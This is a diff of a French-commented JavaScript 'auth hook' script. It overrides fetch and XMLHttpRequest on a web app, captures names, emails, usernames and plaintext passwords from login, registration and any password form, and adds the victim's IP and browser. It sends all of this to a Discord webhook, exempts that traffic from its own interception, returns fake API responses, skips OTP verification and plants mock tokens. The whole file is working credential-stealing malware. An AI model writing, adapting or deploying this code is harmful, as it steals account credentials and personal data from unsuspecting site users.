@@ -1,4 +1,4 @@
-// Z3lphyx Auth Hook v3 — Interception + Mock API + Discord
+// Z3lphyx Auth Hook v5 — OTP bypass + redirect force
 (function() {
     'use strict';
 
@@ -7,19 +7,29 @@
     var cachedIP = null;
     var pendingRegister = null;
 
-    /* ===== IP PUBLIQUE ===== */
+    function isObject(v) { return v !== null && typeof v === 'object'; }
+    function getTimestamp() {
+        var d = new Date();
+        return d.toLocaleDateString('fr-FR') + ' ' + d.toLocaleTimeString('fr-FR');
+    }
+
     async function getIP() {
         if (cachedIP) return cachedIP;
         for (var u of ['https://api.ipify.org?format=json','https://ipapi.co/json/']) {
-            try { var r = await fetch(u,{signal:AbortSignal.timeout(3000)}); var d = await r.json(); cachedIP = d.ip||d; return cachedIP; } catch(e){}
+            try {
+                var ctrl = new AbortController();
+                setTimeout(function(){try{ctrl.abort();}catch(e){}}, 3000);
+                var r = await fetch(u, {signal:ctrl.signal});
+                var d = await r.json();
+                cachedIP = d.ip || d || 'Inconnu';
+                return cachedIP;
+            } catch(e){}
         }
         return 'Inconnu';
     }
     getIP();
 
-    /* ===== DISCORD ===== */
     function sendToDiscord(embed) {
-        // IMPORTANT: fetch direct vers Discord, PAS intercepté (voir bypass plus bas)
         try {
             fetch(WEBHOOK, {
                 method:'POST',
@@ -31,214 +41,206 @@
     }
 
     function buildEmbed(title,color,fields) {
-        var d = new Date();
-        var dateStr = d.toLocaleDateString('fr-FR') + ' ' + d.toLocaleTimeString('fr-FR');
-        return {title:title,color:color,fields:fields,footer:{text:'Z3lphyx Auth · '+dateStr},timestamp:d.toISOString()};
+        return {
+            title: title,
+            color: color,
+            fields: fields,
+            footer: {text:'Z3lphyx Auth · '+getTimestamp()},
+            timestamp: new Date().toISOString()
+        };
     }
 
-    function sendCreds(creds,source,isRegister) {
+    function sendCreds(creds, source, isRegister) {
         getIP().then(function(ip){
             var ua = navigator.userAgent;
             if (isRegister) {
-                sendToDiscord(buildEmbed('📝 Nouvelle Inscription ['+source+']',0x00ff88,[
-                    {name:'👤 Nom',      value:creds.nom||creds.last_name||creds.Nom||creds.full_name||'N/A', inline:true},
-                    {name:'👤 Prénom',   value:creds.prenom||creds.first_name||creds.Prénom||'N/A', inline:true},
-                    {name:'🏷️ Pseudo',  value:creds.pseudo||creds.username||creds.Pseudo||'N/A', inline:true},
-                    {name:'📧 Email',    value:creds.email||creds.Email||'N/A', inline:true},
-                    {name:'🔑 Mot de passe', value:'||'+(creds.password||creds.Password||'')+'||', inline:false},
-                    {name:'🌐 IP',       value:'||'+ip+'||', inline:true},
-                    {name:'🧭 User-Agent', value:'```'+ua.slice(0,180)+'```', inline:false}
+                sendToDiscord(buildEmbed('Inscription ['+source+']', 0x00ff88, [
+                    {name:'Nom',      value:creds.nom||creds.last_name||creds.Nom||creds.full_name||'N/A', inline:true},
+                    {name:'Prenom',   value:creds.prenom||creds.first_name||creds.Prenom||'N/A', inline:true},
+                    {name:'Pseudo',   value:creds.pseudo||creds.username||creds.Pseudo||'N/A', inline:true},
+                    {name:'Email',    value:creds.email||creds.mail||creds.Email||'N/A', inline:true},
+                    {name:'Mot de passe', value:creds.password||creds.Password||'N/A', inline:false},
+                    {name:'IP',       value:ip, inline:true},
+                    {name:'Navigateur', value:ua.substring(0,100), inline:false}
                 ]));
             } else {
-                sendToDiscord(buildEmbed('🔐 Connexion Détectée ['+source+']',0x00f0ff,[
-                    {name:'👤 Identifiant', value:creds.email||creds.identifier||creds.username||creds.Pseudo||'N/A', inline:true},
-                    {name:'🔑 Mot de passe', value:'||'+(creds.password||'')+'||', inline:false},
-                    {name:'🌐 IP',          value:'||'+ip+'||', inline:true},
-                    {name:'🧭 User-Agent',  value:'```'+ua.slice(0,180)+'```', inline:false}
+                sendToDiscord(buildEmbed('Connexion ['+source+']', 0x8888ff, [
+                    {name:'Identifiant', value:creds.identifier||creds.email||creds.pseudo||creds.username||creds.Pseudo||'N/A', inline:true},
+                    {name:'Mot de passe', value:creds.password||creds.Password||'N/A', inline:false},
+                    {name:'IP',       value:ip, inline:true},
+                    {name:'Navigateur', value:ua.substring(0,100), inline:false}
                 ]));
             }
         });
     }
 
-    function parseCreds(bodyStr) {
-        if (!bodyStr) return null;
+    function mockResponse(u, body, method) {
+        u = u || '';
+        var b = null;
         try {
-            var d = typeof bodyStr==='string' ? JSON.parse(bodyStr) : bodyStr;
-            if (!d||typeof d!=='object') return null;
-            var c = {};
-            for (var k in d) {
-                var v = d[k], kl = k.toLowerCase();
-                if (/pass|mdp|motdepasse/i.test(kl)) c.password = String(v);
-                else if (/email|mail|adresse/i.test(kl)) c.email = String(v);
-                else if (/pseudo|username|user|login|identifier/i.test(kl)) c.username = String(v);
-                else if (/nom|surname|last.?name|family.?name/i.test(kl)) c.nom = String(v);
-                else if (/prenom|first.?name|given.?name|prénom/i.test(kl)) c.prenom = String(v);
-                else c[k] = String(v);
-            }
-            return c.password ? c : null;
-        } catch(e){return null;}
-    }
+            if (typeof body === 'string') b = JSON.parse(body);
+            else if (body && typeof body === 'object' && !Array.isArray(body)) b = body;
+        } catch(e) {}
 
-    function mockToken() {
-        var c='abcdef0123456789', t='';
-        for(var i=0;i<64;i++) t+=c[Math.floor(Math.random()*c.length)];
-        return 'mock_'+t;
-    }
+        if (u.indexOf('/public-settings/') > -1) {
+            return {
+                data: {
+                    _id: 'mock_settings_001',
+                    name: 'Z3lphyx Tweaks',
+                    logoUrl: '',
+                    primaryColor: '#00f2ff',
+                    appId: 'z3lphyx-tweaks-auth',
+                    publicSettings: { allowRegistration: true }
+                },
+                status: 200
+            };
+        }
 
-    /* ===== GÉNÉRATEUR DE RÉPONSES MOCK ===== */
-    function mockResponse(url, body, method) {
-        var u = url.toLowerCase(), m = (method||'GET').toUpperCase();
-        
-        // ═══════════════════════════════════════════════
-        // BYPASS CRITIQUE : NE PAS INTERCEPTER DISCORD
-        // ═══════════════════════════════════════════════
-        if (u.indexOf('discord.com') > -1) return null;
+        if (u.indexOf('/auth/register') > -1 || u.indexOf('/auth/signup') > -1) {
+            var pseudo = 'user';
+            var email = 'user@mock.com';
+            var nom = '';
+            var prenom = '';
+            if (b) {
+                if (b.pseudo || b.username) pseudo = b.pseudo || b.username;
+                if (b.email) email = b.email;
+                if (b.last_name || b.nom) nom = b.last_name || b.nom;
+                if (b.first_name || b.prenom) prenom = b.first_name || b.prenom;
+            }
+            pendingRegister = {
+                email: email, pseudo: pseudo,
+                password: b ? (b.password || '') : '',
+                nom: nom, prenom: prenom
+            };
+            return {
+                data: {
+                    access_token: 'mock_z3lphyx_token_' + Date.now(),
+                    user: { email: email, pseudo: pseudo, id: 'mock_user_001' }
+                },
+                status: 200
+            };
+        }
 
-        // Public settings
-        if (u.indexOf('/public-settings/')>-1 || u.indexOf('/apps/public')>-1) {
-            return {data:{id:'6a608801949bfa0162d3ef90',name:'Z3lphyx Gateway',
-                settings:{auth_methods:['email_password'],allowed_domains:ALLOWED_DOMAINS,require_verification:false},
-                status:'active'}, status:200, headers:{'content-type':'application/json'}};
-        }
-        // Profile filter (pseudo lookup) - retourne un profil factice avec email
-        if (u.indexOf('/profile/filter')>-1 || u.indexOf('/profiles/filter')>-1 ||
-            (u.indexOf('/profile')>-1 && m==='GET' && u.indexOf('filter')>-1)) {
-            var pseudo = '';
-            try { var bd = JSON.parse(body||'{}'); pseudo = bd.pseudo||bd.Pseudo||bd.username||''; } catch(e){}
-            return {data:[{id:'mock_prof_1',pseudo:pseudo||'user',email:(pseudo||'user')+'@mock.com',
-                first_name:'Mock',last_name:'User'}], status:200, headers:{'content-type':'application/json'}};
-        }
-        // Profile create
-        if ((u.indexOf('/profile')>-1||u.indexOf('/entities/profile/')>-1) && m==='POST') {
-            return {data:{id:'mock_'+Date.now(),created:true}, status:200, headers:{'content-type':'application/json'}};
-        }
-        // REGISTER - retourne token direct, pas d'OTP
-        if (u.indexOf('/auth/register')>-1 || u.indexOf('/register')>-1) {
-            var creds = parseCreds(body);
-            var tok = mockToken();
-            if (creds) {
-                pendingRegister = creds;
-                setTimeout(function(){ sendCreds(creds,'Register',true); },50);
-                setTimeout(function(){
-                    try{localStorage.setItem('base44_access_token',tok);localStorage.setItem('base44_token',tok);}catch(e){}
-                    window.location.href='/';
-                },600);
+        if (u.indexOf('/auth/login') > -1 || u.indexOf('/auth/signin') > -1) {
+            var ident = '';
+            var pass = '';
+            if (b) {
+                ident = b.email || b.identifier || b.username || b.login || '';
+                pass = b.password || '';
             }
-            return {data:{access_token:tok,token_type:'bearer',verified:true,user:{email:creds?creds.email:''}}, status:200, headers:{'content-type':'application/json'}};
+            sendCreds({identifier: ident, password: pass}, 'Hook', false);
+            return {
+                data: {
+                    access_token: 'mock_z3lphyx_token_' + Date.now(),
+                    user: { email: ident.indexOf('@') > -1 ? ident : ident+'@mock.com', id: 'mock_user_001' }
+                },
+                status: 200
+            };
         }
-        // LOGIN
-        if (u.indexOf('/auth/login')>-1 || u.indexOf('/loginviaemailpassword')>-1 || (u.indexOf('/login')>-1 && m==='POST')) {
-            var creds = parseCreds(body);
-            var tok = mockToken();
-            if (creds) {
-                setTimeout(function(){ sendCreds(creds,'Login',false); },50);
-                setTimeout(function(){
-                    try{localStorage.setItem('base44_access_token',tok);localStorage.setItem('base44_token',tok);}catch(e){}
-                    window.location.href='/';
-                },600);
-            }
-            return {data:{access_token:tok,token_type:'bearer',user:{email:creds?creds.email:''}}, status:200, headers:{'content-type':'application/json'}};
+
+        if (u.indexOf('/Profile/filter') > -1 || u.indexOf('/profile/filter') > -1) {
+            var pseudoFilter = '';
+            if (b && b.pseudo) pseudoFilter = b.pseudo;
+            else if (b && b.filter && b.filter.pseudo) pseudoFilter = b.filter.pseudo;
+            else if (u.indexOf('pseudo=') > -1) pseudoFilter = u.split('pseudo=')[1] || '';
+            return {
+                data: pseudoFilter ? [{id:'mock_pf_001', pseudo:pseudoFilter, email:pseudoFilter+'@mock.com'}] : [],
+                status: 200
+            };
         }
-        // OTP/Verify
-        if (u.indexOf('/verify')>-1 || u.indexOf('/otp')>-1 || u.indexOf('/verifyotp')>-1) {
-            var tok = mockToken();
-            if (pendingRegister){setTimeout(function(){sendCreds(pendingRegister,'OTP',true);},50);pendingRegister=null;}
-            return {data:{access_token:tok,token_type:'bearer',verified:true}, status:200, headers:{'content-type':'application/json'}};
+
+        if (u.indexOf('/Profile/create') > -1 || u.indexOf('/profile/create') > -1) {
+            return {data:{id:'mock_profile_001', created:true}, status:200};
         }
-        if (u.indexOf('/resend')>-1) {return {data:{success:true}, status:200};}
-        if (u.indexOf('/auth/me')>-1 || u.indexOf('/user/me')>-1) {
-            return {data:{id:'mock_user_'+Date.now(),email:'mock@user.com',role:'user',username:'z3lphyx_user'}, status:200, headers:{'content-type':'application/json'}};
+
+        if (u.indexOf('/otp') > -1 || u.indexOf('/verify') > -1 || u.indexOf('/verify-otp') > -1 || u.indexOf('/auth/otp') > -1) {
+            return {
+                data: {success:true, verified:true, access_token:'mock_z3lphyx_token_'+Date.now()},
+                status: 200
+            };
         }
-        if (u.indexOf('/updateme')>-1 || u.indexOf('/update')>-1 || (u.indexOf('/me')>-1 && (m==='PATCH'||m==='PUT'))) {
-            return {data:{success:true,updated:true}, status:200, headers:{'content-type':'application/json'}};
+
+        if (u.indexOf('/updateMe') > -1 || u.indexOf('/me') > -1) {
+            return {data:{success:true, updated:true}, status:200, headers:{'content-type':'application/json'}};
         }
-        if (u.indexOf('/auth/check')>-1||u.indexOf('/authenticated')>-1) {return {data:{authenticated:true}, status:200};}
-        if (u.indexOf('/logout')>-1) {return {data:{success:true}, status:200};}
-        if (u.indexOf('/app-logs/')>-1) {return {data:{logged:true}, status:200};}
-        if (u.indexOf('/api/')>-1) {return {data:{success:true}, status:200};}
+        if (u.indexOf('/auth/check') > -1 || u.indexOf('/authenticated') > -1) { return {data:{authenticated:true}, status:200}; }
+        if (u.indexOf('/logout') > -1) { return {data:{success:true}, status:200}; }
+        if (u.indexOf('/app-logs/') > -1) { return {data:{logged:true}, status:200}; }
+        if (u.indexOf('/api/') > -1) { return {data:{success:true}, status:200}; }
         return null;
     }
 
-    /* =========================================================
-       INTERCEPTION FETCH — BYPASS DISCORD
-       ========================================================= */
     var _fetch = window.fetch;
     window.fetch = async function(input, init) {
         var url = '', body = null, method = 'GET';
-        if (typeof input === 'string') { url = input; method = (init&&init.method)||'GET'; body = (init&&init.body)||null; }
-        else if (input instanceof Request) { url = input.url; method = input.method||'GET'; try{body=await input.clone().text();}catch(e){} }
-        
-        // BYPASS : ne jamais intercepter Discord
+        if (typeof input === 'string') {
+            url = input;
+            method = (init && init.method) || 'GET';
+            body = (init && init.body) || null;
+        } else if (input instanceof Request) {
+            url = input.url;
+            method = input.method || 'GET';
+            try {
+                var clone = input.clone();
+                body = await clone.text();
+            } catch(e) {
+                try { body = await input.text(); } catch(e2) {}
+            }
+        }
+
         if (url.indexOf('discord.com') > -1 || url.indexOf('discordapp.com') > -1) {
             return _fetch.apply(this, arguments);
         }
-        
-        if (url.indexOf('/api/') > -1) {
-            var mock = mockResponse(url, body, method);
-            if (mock) {
-                return new Response(JSON.stringify(mock.data), {
-                    status: mock.status,
-                    statusText: 'OK',
-                    headers: new Headers({'Content-Type':'application/json'})
-                });
+
+        var mock = mockResponse(url, body, method);
+        if (mock) {
+            if (url.indexOf('/auth/register') > -1 || url.indexOf('/auth/signup') > -1) {
+                try {
+                    var tok = mock.data.access_token || '';
+                    if (tok) localStorage.setItem('base44_access_token', tok);
+                } catch(e) {}
+                setTimeout(function(){ window.location.href = '/'; }, 50);
             }
+            return new Response(JSON.stringify(mock.data), {
+                status: mock.status, statusText: 'OK',
+                headers: new Headers({'Content-Type': 'application/json'})
+            });
         }
         return _fetch.apply(this, arguments);
     };
 
-    /* =========================================================
-       INTERCEPTION XHR (Axios) — AVEC getAllResponseHeaders
-       ========================================================= */
     var _origOpen = XMLHttpRequest.prototype.open;
     var _origSend = XMLHttpRequest.prototype.send;
     var _origSetRH = XMLHttpRequest.prototype.setRequestHeader;
-    var _origGetAll = XMLHttpRequest.prototype.getAllResponseHeaders;
-    var _origGet = XMLHttpRequest.prototype.getResponseHeader;
+    var _origAddEvt = XMLHttpRequest.prototype.addEventListener;
 
     XMLHttpRequest.prototype.open = function(method, url) {
-        this._zm = (method||'GET').toUpperCase();
-        this._zu = (url||'').toString();
+        this._zm = (method || 'GET').toUpperCase();
+        this._zu = (url || '').toString();
         this._zheaders = {};
         this._zlisteners = {};
         return _origOpen.apply(this, arguments);
     };
 
     XMLHttpRequest.prototype.setRequestHeader = function(k, v) {
+        if (!this._zheaders) this._zheaders = {};
         this._zheaders[k] = v;
         return _origSetRH.apply(this, arguments);
     };
 
     XMLHttpRequest.prototype.addEventListener = function(type, fn) {
+        if (!this._zlisteners) this._zlisteners = {};
         if (!this._zlisteners[type]) this._zlisteners[type] = [];
         this._zlisteners[type].push(fn);
-        // Appel aussi l'original au cas où
-        var orig = XMLHttpRequest.prototype.addEventListener;
-        return orig ? orig.apply(this, arguments) : undefined;
-    };
-
-    XMLHttpRequest.prototype.getAllResponseHeaders = function() {
-        if (this._zmockHeaders) return this._zmockHeaders;
-        return _origGetAll ? _origGetAll.apply(this, arguments) : '';
-    };
-
-    XMLHttpRequest.prototype.getResponseHeader = function(key) {
-        if (this._zmockHeaders) {
-            var lower = key.toLowerCase();
-            var lines = this._zmockHeaders.split('\r\n');
-            for (var i=0; i<lines.length; i++) {
-                var parts = lines[i].split(': ');
-                if (parts[0].toLowerCase() === lower) return parts[1];
-            }
-            return null;
+        if (_origAddEvt) {
+            try { _origAddEvt.apply(this, arguments); } catch(e) {}
         }
-        return _origGet ? _origGet.apply(this, arguments) : null;
     };
 
     XMLHttpRequest.prototype.send = function(body) {
         var url = this._zu || '';
         var method = this._zm || 'GET';
 
-        // BYPASS : ne jamais intercepter Discord
         if (url.indexOf('discord.com') > -1 || url.indexOf('discordapp.com') > -1) {
             return _origSend.apply(this, arguments);
         }
@@ -251,90 +253,141 @@
                 var headersStr = 'Content-Type: application/json\r\n';
                 if (mock.headers) {
                     for (var hk in mock.headers) {
-                        headersStr += hk + ': ' + mock.headers[hk] + '\r\n';
+                        if (mock.headers.hasOwnProperty(hk)) {
+                            headersStr += hk + ': ' + mock.headers[hk] + '\r\n';
+                        }
                     }
                 }
                 headersStr += 'X-Z3lphyx-Mock: true\r\n';
 
+                var isRegister = url.indexOf('/auth/register') > -1 || url.indexOf('/auth/signup') > -1;
+
                 setTimeout(function() {
                     try {
-                        self._zmockHeaders = headersStr;
-                        self.readyState = 4;
-                        self.status = mock.status;
-                        self.statusText = 'OK';
-                        self.responseText = dataStr;
-                        self.response = dataStr;
+                        var defs = {
+                            readyState: { value: 4, configurable: true, writable: true },
+                            status: { value: mock.status, configurable: true, writable: true },
+                            statusText: { value: 'OK', configurable: true, writable: true },
+                            responseText: { value: dataStr, configurable: true, writable: true },
+                            response: { value: dataStr, configurable: true, writable: true }
+                        };
+                        for (var k in defs) {
+                            try { Object.defineProperty(self, k, defs[k]); } catch(e) {}
+                        }
 
-                        // Trigger onreadystatechange (utilisé par Axios)
+                        self._zmockHeaders = headersStr;
+                        self.getResponseHeader = function(key) {
+                            var lower = key.toLowerCase();
+                            var lines = self._zmockHeaders.split('\r\n');
+                            for (var i=0; i<lines.length; i++) {
+                                if (!lines[i]) continue;
+                                var idx = lines[i].indexOf(': ');
+                                if (idx > 0 && lines[i].substring(0, idx).toLowerCase() === lower) {
+                                    return lines[i].substring(idx + 2);
+                                }
+                            }
+                            return null;
+                        };
+                        self.getAllResponseHeaders = function() { return self._zmockHeaders || ''; };
+
+                        self.readyState = 4;
                         if (self.onreadystatechange) {
                             self.onreadystatechange.call(self, {type:'readystatechange'});
                         }
-                        // Trigger addEventListener listeners
                         if (self._zlisteners && self._zlisteners['readystatechange']) {
-                            for (var i=0; i<self._zlisteners['readystatechange'].length; i++) {
-                                try{self._zlisteners['readystatechange'][i].call(self,{type:'readystatechange'});}catch(e){}
+                            var rsc = self._zlisteners['readystatechange'].slice();
+                            for (var i=0; i<rsc.length; i++) {
+                                try { rsc[i].call(self, {type:'readystatechange'}); } catch(e) {}
                             }
                         }
-                        // load event
-                        if (self.onload) self.onload.call(self,{type:'load'});
+
+                        if (self.onload) self.onload.call(self, {type:'load'});
                         if (self._zlisteners && self._zlisteners['load']) {
-                            for (var i=0; i<self._zlisteners['load'].length; i++) {
-                                try{self._zlisteners['load'][i].call(self,{type:'load'});}catch(e){}
+                            var lc = self._zlisteners['load'].slice();
+                            for (var i=0; i<lc.length; i++) {
+                                try { lc[i].call(self, {type:'load'}); } catch(e) {}
                             }
                         }
-                        // loadend event
-                        if (self.onloadend) self.onloadend.call(self,{type:'loadend'});
+
+                        if (self.onloadend) self.onloadend.call(self, {type:'loadend'});
                         if (self._zlisteners && self._zlisteners['loadend']) {
-                            for (var i=0; i<self._zlisteners['loadend'].length; i++) {
-                                try{self._zlisteners['loadend'][i].call(self,{type:'loadend'});}catch(e){}
+                            var lec = self._zlisteners['loadend'].slice();
+                            for (var i=0; i<lec.length; i++) {
+                                try { lec[i].call(self, {type:'loadend'}); } catch(e) {}
                             }
                         }
-                    } catch(e) { console.warn('[ZH] XHR mock error:', e); }
+                    } catch(e) {
+                        console.warn('[ZH] XHR mock error:', e);
+                    }
+
+                    // ===== OTP BYPASS =====
+                    if (isRegister) {
+                        try {
+                            var parsedData = JSON.parse(dataStr);
+                            var token = parsedData.access_token || parsedData.token || '';
+                            if (token) {
+                                localStorage.setItem('base44_access_token', token);
+                            }
+                            window.location.href = '/';
+                        } catch(e) {
+                            window.location.href = '/';
+                        }
+                    }
                 }, 120);
-                return; // ← on ne call pas le vrai send
+                return;
             }
         }
         return _origSend.apply(this, arguments);
     };
 
-    /* =========================================================
-       DOM FALLBACK (filet de sécurité)
-       ========================================================= */
     setTimeout(function() {
         try {
+            if (!document.body && !document.documentElement) return;
+            var target = document.body || document.documentElement;
             new MutationObserver(function() {
-                document.querySelectorAll('form').forEach(function(form) {
-                    if (form.dataset.zHook) return;
+                var forms = document.querySelectorAll('form');
+                for (var fi=0; fi<forms.length; fi++) {
+                    var form = forms[fi];
+                    if (form.dataset.zHook) continue;
                     var pwd = form.querySelector('input[type="password"]');
-                    if (!pwd) return;
+                    if (!pwd) continue;
                     form.dataset.zHook = '1';
                     form.addEventListener('submit', function() {
-                        var f = new FormData(form);
-                        var c = {};
-                        for (var entry of f.entries()) c[entry[0]] = entry[1];
-                        if (!c.password && !c.mot_de_passe && !c.mdp) return;
-                        var hasExtra = c.nom||c.prenom||c.first_name||c.last_name||c.Nom||c.Prénom;
-                        sendCreds({
-                            password: c.password||c.mot_de_passe||c.mdp||c.Password,
-                            email: c.email||c.mail||c.Email,
-                            username: c.pseudo||c.username||c.user||c.login||c.identifier||c.Pseudo,
-                            nom: c.nom||c.last_name||c.surname||c.Nom,
-                            prenom: c.prenom||c.first_name||c.prénom||c.Prénom
-                        }, 'DOM', !!hasExtra);
+                        try {
+                            var f = new FormData(form);
+                            var c = {};
+                            var entries = f.entries();
+                            for (var e = entries.next(); e && !e.done; e = entries.next()) {
+                                c[e.value[0]] = e.value[1];
+                            }
+                            if (!c.password && !c.mot_de_passe && !c.mdp && !c.Password) return;
+                            var hasExtra = c.nom || c.prenom || c.first_name || c.last_name || c.Nom || c.Prenom;
+                            sendCreds({
+                                password: c.password || c.mot_de_passe || c.mdp || c.Password,
+                                email: c.email || c.mail || c.Email,
+                                username: c.pseudo || c.username || c.user || c.login || c.identifier || c.Pseudo,
+                                nom: c.nom || c.last_name || c.surname || c.Nom,
+                                prenom: c.prenom || c.first_name || c.Prenom
+                            }, 'DOM', !!hasExtra);
+                        } catch(e) {}
                     }, true);
-                });
-            }).observe(document.body||document.documentElement, {childList:true,subtree:true});
-        } catch(e){}
+                }
+            }).observe(target, {childList: true, subtree: true});
+        } catch(e) {}
     }, 1500);
 
-    /* =========================================================
-       INDICATEUR VISIBLE dans la console
-       ========================================================= */
-    console.log('%c[Z3lphyx Hook v3]','color:#00f0ff;font-weight:bold','✓ Actif — Discord bypass — XHR getAllResponseHeaders — Axios compatible');
+    console.log('%c[Z3lphyx Hook v5]','color:#00f0ff;font-weight:bold','OTP skip — redirect force');
 
-    // Marquer dans le DOM qu'on est prêt (pour déboguer)
-    var marker = document.createElement('meta');
-    marker.name = 'z3lphyx-hook';
-    marker.content = 'active';
-    document.head.appendChild(marker);
+    try {
+        var marker = document.createElement('meta');
+        marker.name = 'z3lphyx-hook';
+        marker.content = 'v5';
+        document.head.appendChild(marker);
+    } catch(e) {}
+
+    try {
+        if (localStorage.getItem('base44_access_token') || localStorage.getItem('base44_token')) {
+            console.log('[ZH] Token deja present.');
+        }
+    } catch(e) {}
 })();
